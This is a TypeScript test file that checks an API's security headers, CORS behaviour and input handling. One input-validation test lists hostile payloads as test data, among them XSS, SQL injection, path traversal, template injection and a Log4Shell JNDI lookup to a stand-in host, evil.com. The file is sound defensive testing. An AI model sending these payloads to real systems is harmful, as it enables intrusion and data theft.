/**
 * Security headers and CORS tests
 */

import { describe, it, expect, beforeEach } from 'vitest';
import app from '../../src/index.js';

describe('Security Headers', () => {
  beforeEach(() => {
    (globalThis as any).rateLimitMap = new Map();
  });

  it('should set X-Content-Type-Options header', async () => {
    const res = await app.request('/health');
    expect(res.headers.get('X-Content-Type-Options')).toBe('nosniff');
  });

  it('should set X-Frame-Options header', async () => {
    const res = await app.request('/health');
    expect(res.headers.get('X-Frame-Options')).toBe('DENY');
  });

  it('should set X-XSS-Protection header', async () => {
    const res = await app.request('/health');
    expect(res.headers.get('X-XSS-Protection')).toBe('1; mode=block');
  });

  it('should set Referrer-Policy header', async () => {
    const res = await app.request('/health');
    expect(res.headers.get('Referrer-Policy')).toBe('strict-origin-when-cross-origin');
  });

  it('should set Content-Security-Policy header', async () => {
    const res = await app.request('/health');
    const csp = res.headers.get('Content-Security-Policy');

    expect(csp).toBeTruthy();
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("script-src 'self' 'unsafe-inline'");
    expect(csp).toContain("style-src 'self' 'unsafe-inline'");
    expect(csp).toContain('font-src https://fonts.gstatic.com');
    expect(csp).toContain("img-src 'self' data: https:");
    expect(csp).toContain("connect-src 'self' https://hummbl-api.hummbl.workers.dev");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("form-action 'self'");
  });

  it('should set security headers on all endpoints', async () => {
    const endpoints = ['/health', '/v1/models', '/v1/models/P1', '/v1/transformations'];

    for (const endpoint of endpoints) {
      const res = await app.request(endpoint);
      expect(res.headers.get('X-Content-Type-Options')).toBe('nosniff');
      expect(res.headers.get('X-Frame-Options')).toBe('DENY');
      expect(res.headers.get('X-XSS-Protection')).toBe('1; mode=block');
      expect(res.headers.get('Referrer-Policy')).toBe('strict-origin-when-cross-origin');
      expect(res.headers.get('Content-Security-Policy')).toBeTruthy();
    }
  });

  it('should set security headers on POST requests', async () => {
    const res = await app.request('/v1/recommend', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ problem: 'test problem' }),
    });

    expect(res.headers.get('X-Content-Type-Options')).toBe('nosniff');
    expect(res.headers.get('X-Frame-Options')).toBe('DENY');
    expect(res.headers.get('X-XSS-Protection')).toBe('1; mode=block');
    expect(res.headers.get('Referrer-Policy')).toBe('strict-origin-when-cross-origin');
    expect(res.headers.get('Content-Security-Policy')).toBeTruthy();
  });
});

describe('CORS Configuration', () => {
  beforeEach(() => {
    (globalThis as any).rateLimitMap = new Map();
  });

  it('should set Access-Control-Allow-Origin header', async () => {
    const res = await app.request('/health');
    expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');
  });

  it('should handle OPTIONS requests', async () => {
    const res = await app.request('/health', {
      method: 'OPTIONS',
    });

    // OPTIONS requests should be handled by CORS middleware
    // Hono returns 204 for OPTIONS requests
    expect([200, 204]).toContain(res.status);
  });

  it('should allow requests from any origin', async () => {
    const origins = ['https://example.com', 'https://hummbl.io', 'http://localhost:3000', 'null'];

    for (const origin of origins) {
      const res = await app.request('/health', {
        headers: { Origin: origin },
      });

      expect(res.headers.get('Access-Control-Allow-Origin')).toBe('*');
    }
  });

  it('should allow different HTTP methods', async () => {
    const methods = ['GET', 'POST', 'PUT', 'DELETE'];

    for (const method of methods) {
      const res = await app.request('/health', { method });
      // Should not block requests due to CORS
      expect(res.status).not.toBe(405);
    }
  });

  it('should allow custom headers', async () => {
    const res = await app.request('/health', {
      headers: {
        'X-Custom-Header': 'test-value',
        Authorization: 'Bearer token',
      },
    });

    // Should not block requests with custom headers
    expect(res.status).toBe(200);
  });
});

describe('Input Validation Security', () => {
  beforeEach(() => {
    (globalThis as any).rateLimitMap = new Map();
  });

  it('should handle large payloads safely', async () => {
    const largePayload = 'x'.repeat(10000);

    const res = await app.request('/v1/recommend', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ problem: largePayload }),
    });

    // Should handle large payloads without crashing
    expect(res.status).toBeLessThan(500);
  });

  it('should handle malformed JSON safely', async () => {
    const malformedBodies = [
      '{ invalid json }',
      '{"problem": "unclosed string}',
      '{"problem": null}',
      '{"problem": undefined}',
      'null',
      '',
      '{"problem": {"nested": "object"}}',
    ];

    for (const body of malformedBodies) {
      const res = await app.request('/v1/recommend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body,
      });

      // Should handle malformed JSON gracefully
      expect(res.status).toBeLessThan(500);
    }
  });

  it('should handle special characters in input', async () => {
    const specialInputs = [
      '<script>alert("xss")</script>',
      '"; DROP TABLE users; --',
      '../../etc/passwd',
      '{{7*7}}',
      '${jndi:ldap://evil.com/a}',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
    ];

    for (const input of specialInputs) {
      const res = await app.request('/v1/recommend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ problem: input }),
      });

      // Should handle special characters without script execution
      expect(res.status).toBeLessThan(500);

      if (res.status === 200) {
        const data = await res.json();
        // Response should not contain unescaped special characters
        expect(data.success).toBe(true);
      }
    }
  });

  it('should handle Unicode characters safely', async () => {
    const unicodeInputs = [
      '🚀 Rocket emoji test',
      '中文测试',
      'العربية',
      'עברית',
      '🔥🔥🔥 Fire emojis',
      '\u0000 Null byte',
      '\uFEFF Byte order mark',
    ];

    for (const input of unicodeInputs) {
      const res = await app.request('/v1/recommend', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json; charset=utf-8' },
        body: JSON.stringify({ problem: input }),
      });

      // Should handle Unicode without crashing
      expect(res.status).toBeLessThan(500);
    }
  });
});
